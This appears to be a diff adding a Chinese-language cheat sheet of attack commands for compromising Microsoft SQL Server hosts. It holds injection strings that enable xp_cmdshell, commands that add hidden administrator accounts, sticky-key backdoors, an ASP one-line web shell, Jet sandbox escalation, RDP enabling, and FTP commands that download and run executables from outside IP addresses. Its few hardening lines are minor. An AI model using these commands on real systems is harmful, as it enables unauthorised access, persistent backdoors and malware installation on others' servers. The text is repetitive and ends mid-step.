@@ -1,0 +1,794 @@
+　　一 系统Shell
+
+　　恢复xp_cmdshell
+　　Exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
+
+　　使用xp_cmdshell添加用户
+　　exec xp_cmdshell 'net user user1 /add'
+
+　 　利用OLE对象接口，SQL SERVER提供了一些函数访问OLE对象，分别是sp_OACREATE和sp_OAMethod,可以利用他们调用OLE控件，间接获取一个 shell。使用SP_OAcreate调用对象wscript。shell赋给变量@shell，然后使用SP_OAMETHOD调用@shell的属 性run执行命令。
+  　DECLARE @shell INT
+　　EXEC SP_OAcreate 'wscript.shell',@shell out
+　　EXEC SP_OAMETHOD @shell,'run',null, 'net user ray ray /add'
+  　declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user temp zyi /add'--
+
+
+　　二 数据库查询
+　  查询库
+  　库名称存在master库中的sysdatabases表中，sysdatabases表中的 dbid字段的值大于6的就是用户自己建的库
+　　Select name FROM sysdatabases where dbid>6
+
+  　查询表
+　　表名称存在xyz库中的sysobjects表且xtype='u'
+  　Select *FROM sysobjects where xtype='u'
+　　查询字段
+  　该表的字段存在xyz库中的syscolumns表，且id等于sysobjects表中test表对应的id
+　　Select * FROM syscolumns where id='357576312'
+
+　　三 注册表操作
+　　利用xp_regwrite写注册表项
+  　EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\c urrentversion\run','shell','REG_SZ','C:\windows\sys tem32\cmd.exe /c net user ray ray /add'
+
+　　查看注册表
+　　Exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\C urrentVersion\Run'
+
+
+　　四 文件操作
+
+　　历遍目录
+  　exec master.dbo.xp_dirtree 'c:\'
+
+　　获取子目录
+　　exec master.dbo.xp_subdirs 'c:\'
+
+    判断目录或文件是否存在
+　　exec master..xp_fileexist 'c:\boot.ini'
+
+
+exec xp_cmdshell 'net user mm 123 /add'  --添加一用户
+exec xp_cmdshell 'net localgroup administrators mm /add' 
+
+111111.  Error Message:未能找到存储过程 'master..xp_cmdshell'。
+222222.  Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。
+333333.  SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，
+444444.  无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
+555555.  无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
+666666.  Error Message:xpsql.cpp: 错误 5 来自 CreateProcess（第 675 行）
+777777.  Error Message:无法装载 DLL或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。
+888888.  Error Message:无法装载 DLL xpweb70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。
+999999.  xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行）
+212121.  Error Message:无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)。
+
+三.常见情况恢复执行xp_cmdshell.
+1 未能找到存储过程'master..xpcmdshell'.
+恢复方法：查询分离器连接后,
+第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int 
+第二步执行:sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 
+然后按F5键命令执行完毕
+2 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
+恢复方法：查询分离器连接后,
+第一步执行：sp_dropextendedproc "xp_cmdshell"
+第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
+然后按F5键命令执行完毕
+3 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
+恢复方法：查询分离器连接后,
+第一步执行:exec sp_dropextendedproc 'xp_cmdshell'
+第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll' 
+然后按F5键命令执行完毕
+四.终极方法.
+如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:
+
+
+拒绝访问 
+
+Net1
+
+Dir net.exe /s /p
+
+
+直接添加账号：
+c:\windows\system32\net1.exe user iis_user 12345 /add
+c:\windows\system32\net1.exe localgroup administrators iis_user /add
+
+copy 服务器后门：
+copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
+copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
+attrib c:\windows\system32\sethc.exe +h
+attrib c:\windows\system32\dllcache\sethc.exe +h
+
+直接添加账号2：
+c:\windows\system32\cmd.exe /c net1.exe user iis_user 12345 /add
+c:\windows\system32\cmd.exe /c net1.exe localgroup administrators iis_user /add
+
+直接添加账号3：
+c:\windows\system32\command.com /c net1.exe user iis_user 12345 /add
+c:\windows\system32\command.com /c net1.exe localgroup administrators iis_user /add
+
+
+查看系统版本
+type c:\boot.ini 
+
+普通CMD后门
+xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\cmd.exe'
+
+
+
+5下shift后门命令
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out 
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
+declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out 
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
+copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
+copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
+
+
+
+SQL写一句话
+exec master.dbo.xp_subdirs 'd:\web\cdlxkj'; 
+exec sp_makewebtask 'd:\web\cdlxkj\XX.asp','select''<%execute(request("SB"))%>'' '
+
+
+
+SA沙盒模式提权：
+1.  exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
+2.  Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user     sql$ 123 /add")');
+3.  Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators sql$ /add")');
+
+
+建立用户1-这里默认用户  iis_user 12345
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell("cmd.exe /c net1 user iis_user 12345 /ad &net localgroup administrators iis_user /add")')
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net1 user iis_user 12345 /add &net localgroup administrators iis_user /ad")')
+
+
+如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户: 126错误！命令
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user iis_user 12345 /add'
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators iis_user /add'
+
+
+1.sql命令查询注册表粘滞键是否被劫持
+exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
+2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)
+xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe', 
+'Debugger','REG_SZ','C:\WINDOWS\system32\taskmgr.exe'
+3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用
+xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
+
+
+
+
+
+
+111111   Error Message:未能找到存储过程 'master..xp_cmdshell'。
+修复法：很通用的，其实碰到 其他126 127的都可以一起修复，
+除了xplog70.dll其他的都可以用这命令修复
+xp_cmdshell新的恢复办法 
+第一步先删除：
+drop procedure sp_addextendedproc 
+drop procedure sp_oacreate 
+exec sp_dropextendedproc 'xp_cmdshell' 
+服务器: 消息 3701，级别 11，状态 5，行 1
+无法 除去 过程 'sp_addextendedproc'，因为它在系统目录中不存在。
+服务器: 消息 3701，级别 11，状态 5，过程 sp_dropextendedproc，行 18
+无法 除去 过程 'xp_cmdshell'，因为它在系统目录中不存在。
+第二步恢复：
+dbcc addextendedproc ("sp_oacreate","odsole70.dll") 
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll") 
+直接恢复，不管sp_addextendedproc是不是存在 
+
+
+
+222222： xplog70.dll修复：
+Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。
+修复XPLOG70.DLL（先用文件查看下备份的目录下\x86\bin,然后把下面目录替换）
+第一步
+exec sp_dropextendedproc 'xp_cmdshell'
+第二步
+dbcc addextendedproc ("xp_cmdshell","c:\sql2ksp4\x86\binn\xplog70.dll")
+
+
+未能找到存储过程 'master..xp_cmdshell'。
+第一步:
+create procedure sp_addextendedproc --- 1996/08/30 20:13
+@functname nvarchar(517),/* (owner.)name of function to call
+*/
+@dllname varchar(255)/* name of DLL containing function */
+as
+set implicit_transactions off
+if @@trancount > 0
+begin
+raiserror(15002,-1,-1,'sp_addextendedproc')
+return (1)
+end
+dbcc addextendedproc( @functname, @dllname)
+return (0) -- sp_addextendedproc
+GO
+第二步:
+EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int
+
+
+333333.   SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。 
+;EXEC sp_configure 'show advanced options', 1 -- 
+;RECONFIGURE WITH OVERRIDE -- 
+;EXEC sp_configure 'xp_cmdshell', 1 -- 
+;RECONFIGURE WITH OVERRIDE -- 
+;EXEC sp_configure   'show advanced options', 0 -- 
+
+
+我%' ;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
+返回正常,开启成功,我们来看下我们现在能不能用xp_cmdshell
+
+我%';exec master..xp_cmdshell"net user yhsafe yhsafe /add & net localgroup administrators yhsafe /add"--
+
+
+
+删除sql危险存储： 
+DROP PROCEDURE sp_makewebtask 
+exec master..sp_dropextendedproc xp_cmdshell 
+exec master..sp_dropextendedproc xp_dirtree 
+exec master..sp_dropextendedproc xp_fileexist 
+exec master..sp_dropextendedproc xp_terminate_process 
+exec master..sp_dropextendedproc sp_oamethod 
+exec master..sp_dropextendedproc sp_oacreate 
+exec master..sp_dropextendedproc xp_regaddmultistring 
+exec master..sp_dropextendedproc xp_regdeletekey 
+exec master..sp_dropextendedproc xp_regdeletevalue 
+exec master..sp_dropextendedproc xp_regenumkeys 
+exec master..sp_dropextendedproc xp_regenumvalues 
+exec master..sp_dropextendedproc sp_add_job 
+exec master..sp_dropextendedproc sp_addtask 
+exec master..sp_dropextendedproc xp_regread 
+exec master..sp_dropextendedproc xp_regwrite 
+exec master..sp_dropextendedproc xp_readwebtask 
+exec master..sp_dropextendedproc xp_makewebtask 
+exec master..sp_dropextendedproc xp_regremovemultistring 
+exec master..sp_dropextendedproc sp_OACreate 
+DROP PROCEDURE sp_addextendedproc 
+
+
+恢复扩展存储过程的办法 
+先恢复sp_addextendedproc，语句如下： 
+第一：
+create procedure sp_addextendedproc --- 1996/08/30 20:13 
+@functname nvarchar(517),/* (owner.)name of function to call */ @dllname varchar(255)/* name of DLL containing function */ as 
+set implicit_transactions off 
+if @@trancount > 0   
+begin 
+raiserror(15002,-1,-1,'sp_addextendedproc')   
+return (1)   
+end 
+dbcc addextendedproc( @functname, @dllname)   
+return (0) -- sp_addextendedproc 
+GO 
+第二： 
+use master   
+exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'   
+exec sp_addextendedproc xp_dirtree,'xpstar.dll'   
+exec sp_addextendedproc xp_enumgroups,'xplog70.dll'   
+exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'   
+exec sp_addextendedproc xp_loginconfig,'xplog70.dll'   
+exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'   
+exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'   
+exec sp_addextendedproc sp_OACreate,'odsole70.dll'   
+exec sp_addextendedproc sp_OADestroy,'odsole70.dll'   
+exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'   
+exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'   
+exec sp_addextendedproc sp_OAMethod,'odsole70.dll'   
+exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'   
+exec sp_addextendedproc sp_OAStop,'odsole70.dll'   
+exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'   
+exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'   
+exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'   
+exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'   
+exec sp_addextendedproc xp_regread,'xpstar.dll'   
+exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'   
+exec sp_addextendedproc xp_regwrite,'xpstar.dll'   
+exec sp_addextendedproc xp_availablemedia,'xpstar.dll'
+
+
+
+删除扩展存储过过程xp_cmdshell的语句: 
+exec sp_dropextendedproc 'xp_cmdshell' 
+
+恢复cmdshell的sql语句 
+exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll' 
+
+
+开启cmdshell的sql语句 
+exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll' 
+
+
+判断存储扩展是否存在 
+select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 
+返回结果为1就ok 
+
+
+恢复xp_cmdshell 
+exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll';select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 
+返回结果为1就ok 
+否则上传xplog7.0.dll 
+exec master.dbo.addextendedproc 'xp_cmdshell','c:\winnt\system32\xplog70.dll' 
+
+
+堵上cmdshell的sql语句 
+sp_dropextendedproc "xp_cmdshell 
+
+
+一.更改sa口令方法：
+用sql综合利用工具连接后，执行命令：
+exec sp_password NULL,'新密码','sa'
+(提示：慎用!)
+
+
+
+二.简单修补sa弱口令.
+方法1:查询分离器连接后执行：
+if exists (select * from 
+dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]') and 
+OBJECTPROPERTY(id, N'IsExtendedProc') = 1)
+exec sp_dropextendedproc N'[dbo].[xp_cmdshell]'
+GO
+然后按F5键命令执行完毕
+
+
+方法2:查询分离器连接后
+第一步执行：use master 
+第二步执行：sp_dropextendedproc 'xp_cmdshell' 
+然后按F5键命令执行完毕
+
+
+444444. 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
+恢复方法：查询分离器连接后,
+第一步执行：sp_dropextendedproc "xp_cmdshell"
+第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
+
+
+
+555555. 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
+恢复方法：查询分离器连接后,
+第一步执行:exec sp_dropextendedproc 'xp_cmdshell'
+第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'            
+然后按F5键命令执行完毕
+
+
+
+如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:
+查询分离器连接后,
+2000servser系统:
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user Web hacker /add'
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators Web /add'
+
+
+
+C:\>DIR C:\
+SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
+分析器执行的语句：
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+
+
+
+有时候用查询分离器连接执行以上语句的时候会出现找不到存储过程 sp_addextendedproc
+解决方法:
+create procedure sp_addextendedproc --- 1996/08/30 20:13
+@functname nvarchar(517),/* (owner.)name of function to call */
+@dllname varchar(255)/* name of DLL containing function */
+as
+set implicit_transactions off
+if @@trancount > 0
+begin
+raiserror(15002,-1,-1,'sp_addextendedproc')
+return (1)
+end
+dbcc addextendedproc( @functname, @dllname)
+return (0) -- sp_addextendedproc
+GO
+这段代码贴入查询分离器,执行
+
+
+资源管理器：
+c:\windows\explorer.exe
+
+查看目录
+exec master.dbo.xp_subdirs 'c:\' 
+列出磁盘
+exec master..xp_fixeddrives 
+9999999.  xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行） 直接加帐号！
+EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
+Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user 123 123 /add")');
+Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators 123 /add")');
+
+
+
+echo Windows Registry Editor Version 5.00 >3389.reg 
+echo. >>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] >>3389.reg 
+echo "Enabled"="0" >>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >>3389.reg 
+echo "ShutdownWithoutLogon"="0" >>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] >>3389.reg 
+echo "EnableAdminTSRemote"=dword:00000001 >>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>3389.reg 
+echo "TSEnabled"=dword:00000001 >>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] >>3389.reg 
+echo "Start"=dword:00000002 >>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] >>3389.reg 
+echo "Start"=dword:00000002 >>3389.reg 
+echo [HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] >>3389.reg 
+echo "Hotkey"="1" >>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] >>3389.reg 
+echo "PortNumber"=dword:00000D3D >>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] >>3389.reg 
+echo "PortNumber"=dword:00000D3D >>3389.reg 
+regedit /s 3389.reg
+开3389：
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--  
+
+关3389：
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;  
+查看3389端口
+exec xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
+
+
+
+
+
+
+
+win2K直接上PS马
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell("cmd.exe /c @echo open 60.190.176.85>>net.txt&@echo reconditeness>>net.txt&@echo 7259>>net.txt&@echo get 0.exe>>net.txt&@echo bye>>net.txt&@ftp -s:net.txt&del net.txt & 0.exe")')
+
+
+win03-XP直接上PS马
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c @echo open 60.190.176.85>>net.txt&@echo reconditeness>>net.txt&@echo 7259>>net.txt&@echo get 0.exe>>net.txt&@echo bye>>net.txt&@ftp -s:net.txt&del net.txt & 0.exe")')
+
+
+
+
+declare @o int
+exec sp_oacreate 'wscript.shell', @o out
+exec sp_oamethod @o, 'run', NULL, 'XXXXX' 为你要执行的命令
+
+
+
+写入注册表指定的键里指定的值)，使用方法(在键HKEY_LOCAL_MACHINE\SOFTWARE\aaa\aaaValue写入bbb)： 
+EXEC master..xp_regwrite 
+@rootkey='HKEY_LOCAL_MACHINE', 
+@key='SOFTWARE\aaa', 
+@value_name='aaaValue', 
+@type='REG_SZ', 
+@value='bbb' 
+
+
+@echo open 121.22.56.5>c:\bin.txt&@echo list>>c:\bin.txt&@echo list>>c:\bin.txt&@echo get gzn.exe>>c:\bin.txt&@echo bye>>c:\bin.txt&@ftp -s:c:\bin.txt&del c:\bin.txt&gzn.exe&gzn.exe&gzn.exe
+
+先copy 到wmpub目录里
+@echo cd c:\wmpub\>c:\wmpub\in.bat&@echo ftp -s:c:\wmpub\xiuxiu.txt>>c:\wmpub\in.bat
+
+开3389
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+C:\WINDOWS\system32\dllcache\net1.exe localgroup administrators IUSR_SERVER /add
+
+
+
+
+3389   SHIFT
+用上的语句:
+入侵
+EXEC master..xp_regwrite
+@rootkey='HKEY_LOCAL_MACHINE',
+@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
+@value_name='Debugger',
+@type='REG_SZ',
+@value='C:\WINDOWS\explorer.exe' 
+
+恢复
+EXEC master..xp_regwrite
+@rootkey='HKEY_LOCAL_MACHINE',
+@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
+@value_name='Debugger',
+@type='REG_SZ',
+@value=''
+
+映象劫持
+EXEC master..xp_regwrite ---这是注册表编辑!
+@rootkey='HKEY_LOCAL_MACHINE', ---这是位置!
+@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',  -----这也是位置!
+@value_name='Debugger',  ---这是表名!
+@type='REG_SZ',        ---这里是写入的意思!
+@value='C:\WINDOWS\explorer.exe'   ----这里是写入内容!
+整个过程是利用master..xp_regwrite这组件来完成的,
+
+
+
+
+sql写文件
+declare @o int, @f int, @t int, @ret int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'createtextfile', @f out, 'c:\1.vbs', 1
+exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject("WSCRIPT.NETWORK")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.ComputerName'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&"/Administrators,group")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create("user","test")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "1234"'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo '
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&"/test",user) '
+exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/test"'
+
+
+无NET提权的脚本
+struser=wscript.arguments(0)
+strpass=wscript.arguments(1)
+set lp=createObject("WSCRIPT.NETWORK") 
+oz="WinNT://"&lp.ComputerName 
+Set ob=GetObject(oz) 
+Set oe=GetObject(oz&"/Administrators,group") 
+Set od=ob.create("user",struser) 
+od.SetPassword strpass 
+od.SetInfo 
+Set of=GetObject(oz&"/" & struser & ",user") 
+oe.Add(of.ADsPath) 
+For Each admin in oe.Members
+if struser=admin.Name then
+Wscript.echo struser & " 建立成功!"
+wscript.quit
+end if
+Next
+Wscript.echo struser & " 用户建立失败!"
+将以上保存为user.VBS文件
+然后执行：cscript user.vbs 用户名 密码
+删除xp_cmdshell命令：（分离器中执行）
+exec sp_dropextendedproc 'xp_cmdshell'
+注册表修改3389终端连接命令：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp （PortNumber） 端口
+方法1:查询分离器连接后
+第一步执行：use master 
+第二步执行：sp_dropextendedproc 'xp_cmdshell' 
+然后按F5键命令执行完毕
+
+
+
+
+方法二
+xp_cmdshell新的恢复办法
+删除
+drop procedure sp_addextendedproc
+drop procedure sp_oacreate
+exec sp_dropextendedproc 'xp_cmdshell'
+恢复
+dbcc addextendedproc ("sp_oacreate","odsole70.dll")
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
+这样可以直接恢复，不用去管sp_addextendedproc是不是存在
+-----------------------------
+删除扩展存储过过程xp_cmdshell的语句:
+exec sp_dropextendedproc 'xp_cmdshell'
+恢复cmdshell的sql语句
+exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
+
+开启cmdshell的sql语句
+exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
+判断存储扩展是否存在
+select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+返回结果为1就ok
+恢复xp_cmdshell
+exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll';select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+返回结果为1就ok
+否则上传xplog7.0.dll
+exec master.dbo.addextendedproc 'xp_cmdshell','c:\winnt\system32\xplog70.dll'
+堵上cmdshell的sql语句
+sp_dropextendedproc "xp_cmdshell 
+
+
+WINDOWS系统使用：
+echo open 218.26.89.17 >C:\WINDOWS\1.txt
+echo 1 >>C:\WINDOWS\1.txt
+echo 1 >>C:\WINDOWS\1.txt
+echo get BUG.exe>>C:\WINDOWS\1.txt
+echo bye>>C:\WINDOWS\1.txt
+ftp -s:C:\WINDOWS\1.txt
+BUG.exe
+del C:\WINDOWS\1.txt
+NT系统使用：
+echo open 218.26.89.17 >C:\WINNT\1.txt
+echo 1 >>C:\WINNT\1.txt
+echo 1 >>C:\WINNT\1.txt
+echo get BUG.exe>>C:\WINNT\1.txt
+echo bye>>C:\WINNT\1.txt
+ftp -s:C:\WINNT\1.txt
+BUG.exe
+del C:\WINNT\1.txt
+
+
+系统后门：
+copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
+copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
+attrib c:\windows\system32\sethc.exe +h
+attrib c:\windows\system32\dllcache\sethc.exe +h
+恢复存储过程'master..xpcmdshell'：
+EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int 
+
+
+卸载存储过程xp_cmdshell：
+sp_dropextendedproc 'xp_cmdshell'
+
+
+
+
+第一、Error Message:未能找到存储过程 'master..xp_cmdshell'。
+
+修复方法：xp_cmdshell新的恢复办法 
+
+第一步先删除：
+
+drop procedure sp_addextendedproc 
+
+drop procedure sp_oacreate 
+
+exec sp_dropextendedproc 'xp_cmdshell' 
+
+服务器: 消息 3701，级别 11，状态 5，行 1
+
+ 
+
+第二步恢复：
+
+dbcc addextendedproc ("sp_oacreate","odsole70.dll") 
+
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll") 
+
+直接恢复，不管sp_addextendedproc是不是存在 
+
+ 
+
+第二、拒绝访问 
+
+Net1
+
+Dir net.exe /s /p
+
+ 
+
+第三、Error Message:SQL Server 阻止了对组件 'xp_cmdshell' 的 过程 'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
+
+;EXEC sp_configure 'show advanced options', 1 -- 
+
+;RECONFIGURE WITH OVERRIDE -- 
+
+;EXEC sp_configure 'xp_cmdshell', 1 -- 
+
+;RECONFIGURE WITH OVERRIDE -- 
+
+;EXEC sp_configure   'show advanced options', 0 -- 
+
+ 
+
+888888、Error Message:无法装载 DLL xpweb70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。
+
+ 
+
+第一步
+
+exec sp_dropextendedproc 'xp_cmdshell'
+
+ 
+
+第二步
+
+dbcc addextendedproc ("xp_cmdshell","c:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll")
+
+;EXEC sp_configure   'show advanced options', 0 -- 
+
+ 
+
+2121212121第五、Error Message:无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)。
+
+ 
+
+第一步
+
+exec sp_dropextendedproc 'xp_cmdshell'
+
+ 
+
+第二步
+
